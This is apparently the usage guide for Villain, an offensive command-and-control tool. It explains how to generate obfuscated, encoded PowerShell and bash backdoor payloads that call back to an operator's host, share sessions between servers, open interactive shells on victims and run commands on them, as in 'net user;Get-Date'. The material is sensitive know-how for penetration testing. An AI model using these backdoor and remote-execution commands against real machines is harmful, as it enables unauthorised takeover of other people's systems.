# Usage Guide
:warning: Villain was explicitly developed and tested on **kali linux**.  
:warning: This guide is a work in progress currently describing key features. Check out Villain's introduction on youtube for more info.

## Table of contents
1. [Generate Backdoor Payloads](Generate-Backdoor-Payloads)
2. [Connect With Sibling Server](Connect-With-Sibling-Server)
3. [The shell Command](The-shell-Command)
4. [The exec Command](The-exec-Command)

## Generate Backdoor Payloads
Use the "generate" prompt command to generate backdoor payloads for Windows or Linux machines. 

```
generate os=<OS Type> lhost=<IP or INTERFACE> [ exec_outfile=<REMOTE PATH> domain=<DOMAIN>] [ obfuscate encode constraint_mode ]
```
Each generated payload is going to work only once. An already used payload cannot be reused to establish a session.
The backdoors are designed to start as new background processes. Currently supported types of backdoors:  
 - for Windows: Powershell 
 - for Linux: bash

#### Available arguments for the "generate" prompt command:
| Argument          | Required | Supported OS | Requires Input Val | Description |
|:-----------------:|:-------:|:-------------:|:------------------:|------------------------|
| os                | True    | All           | Yes                | The OS type to generate backdoor for [windows/linux]. |
| lhost             | True    | N/A           | Yes                | Your local IP or Interface to connect back. |
| domain            | Depends | N/A           | Yes                | If you have provided trusted cert and priv_key files to start Villain with SSL, you can provide domain instead of lhost. |
| obfuscate         | False   | Windows       | No                 | Auto-obfuscate the generated payload. This aims to assist you, not always do the job for you. |
| encode            | False   | Windows       | No                 | Base64 encode the generated payload. |
| exec_outfile      | False   | Windows       | Yes                | Provide a file path on the victim to write & execute commands from (instead of using IEX) |
| constraint_mode   | False   | Windows       | No                 | Make the generated payload work on PowerShell Constraint Language Mode. By using this option you sacrifice a bit of the decoding clarity of your shell. |

#### Examples:
```
# For Windows:
Villain > generate os=windows lhost=eth0 obfuscate
Villain > generate os=windows lhost=192.168.12.36 exec_outfile="C:\Users\\\$env:USERNAME\.local\hack.ps1" encode

# For Linux:
Villain > generate os=linux lhost=192.168.12.62
```

## Connect With Sibling Server
Use the `connect` prompt command to connect and share your backdoor sessions with another machine running Villain. 
```
connect <IP> <CORE SERVER PORT>
```
By default, the Core server port is `65001` (you can change that with `-p` when starting Villain).

## The shell Command
Use the `shell` prompt command to start an interactive HoaxShell against a session. 
```
shell <SESSION ID or ALIAS>
```
Press Ctrl + C or type `exit` to return to the main Villain prompt.

## The exec Command
Use the `exec` prompt command to execute a **quoted command** or **script from your file system** against a session. 
```
exec </path/to/local/file> <SESSION ID or ALIAS>
exec 'net user;Get-Date' <SESSION ID or ALIAS>
```
